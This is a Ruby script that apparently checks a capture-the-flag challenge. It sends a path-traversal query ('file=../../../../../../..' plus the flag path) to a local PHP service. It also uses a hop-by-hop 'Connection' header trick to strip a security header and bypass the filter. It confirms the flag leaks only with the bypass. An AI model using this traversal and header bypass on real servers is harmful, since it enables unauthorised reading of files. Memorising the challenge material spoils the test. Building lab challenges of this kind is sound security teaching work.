require 'httparty'


TARGET = String::new(ARGV[0] || 'http://localhost:9876')
if TARGET[-1] != '/'
  TARGET.concat('/')
end

METADATA = YAML::load(File.read('../metadata.yml'))
EXPECTED_FLAG = METADATA['flag']
DEFAULT_PORT = METADATA['port']
FLAG_PATH = METADATA['flag_path']

HOST = ARGV[0] || "http://localhost:#{ DEFAULT_PORT }/"
HEADER = 'X-Security-Danger'
PATH = 'index.php'
SAFE_QUERY = 'file=1.jpg'
EVIL_QUERY = "file=../../../../../../..#{ FLAG_PATH }"
SEARCH_BAD = 'ABORTING'

SAFE_URL = "#{ TARGET }#{ PATH }?#{ SAFE_QUERY }"
EVIL_URL = "#{ TARGET }#{ PATH }?#{ EVIL_QUERY }"

BYPASS_HEADER = { headers: { 'Connection' => HEADER } }

def test(url, headers, expected)
  response = HTTParty.get(url, headers).parsed_response
  if response.include?(SEARCH_BAD)
    if expected == false
      puts 'Passed!'
    else
      puts "Uh oh! Something returned the wrong response!"
      exit 1
    end
  else
    if expected == true
      puts 'Passed!'
    else
      puts "Uh oh! Something returned the wrong response!"
      exit 1
    end
  end

  return response
end

puts "Testing SAFE_URL with no bypass"
test(SAFE_URL, {}, true)

puts "Testing SAFE_URL with bypass"
test(SAFE_URL, BYPASS_HEADER, true)

puts "Testing EVIL_URL with no bypass"
bad_result = test(EVIL_URL, {}, false)
if bad_result.include?(EXPECTED_FLAG)
  puts "Uh oh! Our bad test returned the flag. That's bad!"
  exit 1
end

puts "Testing EVIL_URL with bypass"
good_result = test(EVIL_URL, BYPASS_HEADER, true)

if !good_result.include?(EXPECTED_FLAG)
  puts "Uh oh! The exploit didn't return the correct flag!"
  puts "Expected: #{ EXPECTED_FLAG }"
  puts "Got #{ good_result }"
  exit 1
end
puts good_result
puts "Success!"
exit 0
